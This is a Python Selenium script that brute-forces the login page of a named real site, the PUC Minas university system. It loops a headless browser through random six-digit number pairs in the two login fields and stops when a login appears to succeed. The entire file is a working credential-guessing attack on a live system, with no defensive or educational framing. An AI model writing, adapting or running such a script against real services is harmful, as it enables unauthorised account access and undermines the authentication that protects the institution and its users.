from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import random
import time

url = "https://www.sistemas.pucminas.br/sgc/SilverStream/Pages/pgLoginSSL.html"

chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--window-size=1920,1080")

driver = webdriver.Chrome(options=chrome_options)
driver.get(url)

WebDriverWait(driver, 10).until(EC.frame_to_be_available_and_switch_to_it("principal"))

while True:
    try:
        campo1 = WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.NAME, "S61_"))
        )
        campo2 = WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.NAME, "S63_"))
        )

        num1 = random.randint(100000, 999999)
        num2 = random.randint(100000, 999999)
        while num1 == num2:
            num2 = random.randint(100000, 999999)

        campo1.clear()
        campo1.send_keys(str(num1))
        campo2.clear()
        campo2.send_keys(str(num2))

        botao_ok = WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.NAME, "S65_"))
        )
        botao_ok.click()

        time.sleep(0.5)


        driver.switch_to.default_content()
        WebDriverWait(driver, 5).until(EC.frame_to_be_available_and_switch_to_it("principal"))

        driver.find_element(By.NAME, "S61_")
        driver.find_element(By.NAME, "S63_")

        print(f"Números: {num1} e {num2}: Falho.")

    except Exception:
        print(f"Números: {num1} e {num2}: Sucesso.")
        break

driver.quit()
